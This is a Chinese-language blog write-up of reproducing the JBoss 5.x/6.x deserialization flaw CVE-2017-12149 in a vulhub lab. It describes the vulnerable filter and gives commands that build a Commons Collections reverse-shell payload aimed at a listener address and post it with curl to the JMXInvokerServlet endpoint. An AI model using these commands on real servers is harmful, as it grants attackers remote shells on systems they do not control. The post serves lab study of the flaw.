# CVE-2017-12149 JBoss 5.x6.x 反序列化漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15717443.html`](https://www.cnblogs.com/peace-and-romance/p/15717443.html)

### 0X00-引言

* * *

淦，今天工作量拉满，累死了

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-环境描述

* * *

该漏洞为 Java 反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。其 doFilter 方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。

影响版本：

JbossAS 5.x

JbossAS 6.x

### 0X03-漏洞复现

* * *

##### 01-验证

`http://192.168.234.128:8080/invoker/readonly`

![image-20211221215147927](img/ef4fcc273c0703d2b6fa7f16f0b9dfca.png)

##### 02-重定向到`ReverseShellCommonsCollectionsHashMap.ser`文件

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.234.135:888   #填写监听机 IP 和 port
curl http://192.168.234.128:8080//invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser  #提交二进制数据 
```

![image-20211221200545588](img/7a3fe15fb4d0342fbf35d6f203e77dfc.png)

![image-20211221215327022](img/2eaf4cb405e7ce1e8b8a6f9790d277f5.png)

##### 03-反弹 shell

![image-20211221215357984](img/5efed1eaa267a7768a0dd60459306da9.png)

### 0X04-工具检测

* * *

工具下载：[`github.com/s0k/Deserialize`](https://github.com/s0k/Deserialize)

![image-20211221220020687](img/b5f32b1182969f65927cf7065d929b90.png)

### 0X05-免责声明

* * *

仅供学习参考

### 0X06-参考

* * *

[[Vulhub] JBoss 反序列化漏洞复现](https://blog.csdn.net/weixin_45605352/article/details/120305428?utm_term=vulhub%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-120305428&spm=3001.4430)